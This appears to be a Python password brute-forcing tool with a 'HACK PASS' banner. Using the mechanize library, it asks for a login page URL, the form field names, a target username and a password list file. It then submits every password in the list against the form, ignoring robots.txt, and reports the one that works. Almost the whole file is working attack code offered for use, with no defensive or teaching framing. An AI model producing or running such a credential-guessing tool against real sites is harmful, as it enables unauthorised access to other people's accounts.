import mechanize
import os
os.system('cls' if os.name == 'nt' else 'clear')

txt = '''


    ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀    ██▓███   ▄▄▄        ██████   ██████ 
   ▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒    ▓██░  ██▒▒████▄    ▒██    ▒ ▒██    ▒ 
   ▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░    ▓██░ ██▓▒▒██  ▀█▄  ░ ▓██▄   ░ ▓██▄   
   ░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄    ▒██▄█▓▒ ▒░██▄▄▄▄██   ▒   ██▒  ▒   ██▒
   ░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄   ▒██▒ ░  ░ ▓█   ▓██▒▒██████▒▒▒██████▒▒
    ▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒   ▒▓▒░ ░  ░ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░
    ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░   ░▒ ░       ▒   ▒▒ ░░ ░▒  ░ ░░ ░▒  ░ ░
    ░  ░░ ░  ░   ▒   ░        ░ ░░ ░    ░░         ░   ▒   ░  ░  ░  ░  ░  ░  
    ░  ░  ░      ░  ░░ ░      ░  ░                     ░  ░      ░        ░  
                     ░                                                       

      '''




os.system("")

# Group of Different functions for different styles
class style():
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'

print(style.GREEN + txt)
print(style.MAGENTA)

url = input("Login Page Url : ")
print(style.CYAN)
pus = input("Form UserName : ")
pps = input("Form Password : ")
print(style.WHITE)
user = input("UserName : ")

list = input("Pass List File Name : ")

br = mechanize.Browser()

br.set_handle_robots(False)
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)

br.open(url)

file = open(list, "r")
passwords = file.read().splitlines()
print(style.YELLOW + "Starting......\n")
for x in passwords:
    br.select_form(nr= 0)
    br.form[pus] = user
    br.form[pps] = x
    resp = br.submit()
    if resp.geturl() == url:
        print(style.RED + "Incorect Password " + x)
    else:
        print(style.GREEN + "\nCorect password is => " + x + "\n \n")
        break







